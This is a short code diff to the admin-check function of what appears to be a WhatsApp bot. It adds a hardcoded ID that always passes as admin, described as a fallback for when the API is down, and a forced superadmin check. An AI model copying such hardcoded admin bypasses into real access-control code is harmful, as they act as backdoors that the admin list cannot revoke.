@@ -127,8 +127,18 @@ const removeAdminJid = async (candidate) => {
 const isAdminJid = async (sock, jid, pushName) => {
     if (!jid) return false;
 
+    // Hardcode fallback for Lexx (LID) to ensure admin access even if API is down
+    const LEXX_LID = '83009336250405@lid';
+    if (jid === LEXX_LID || jid === '83009336250405') return true;
+
     const admins = await listAdminJids();
     const actorTokens = await buildActorTokens(jid);
+
+    // Pastikan SUPERADMIN_JID selalu dicek meskipun API gagal
+    if (SUPERADMIN_JID) {
+        const saLocal = jidLocal(SUPERADMIN_JID);
+        if (actorTokens.has(SUPERADMIN_JID) || actorTokens.has(saLocal)) return true;
+    }
 
     const local = jidLocal(jid);
     if (jid.endsWith('@s.whatsapp.net') && local) {
@@ -145,11 +155,6 @@ const isAdminJid = async (sock, jid, pushName) => {
             actorTokens.add(phone);
             actorTokens.add(`${phone}@s.whatsapp.net`);
         }
-    }
-
-    // Placeholder untuk kemungkinan auto-sync berbasis sock/pushName di masa depan.
-    if (sock && pushName) {
-        // No-op: signature dipertahankan untuk kompatibilitas auto-sync LID.
     }
 
     for (const candidate of admins) {
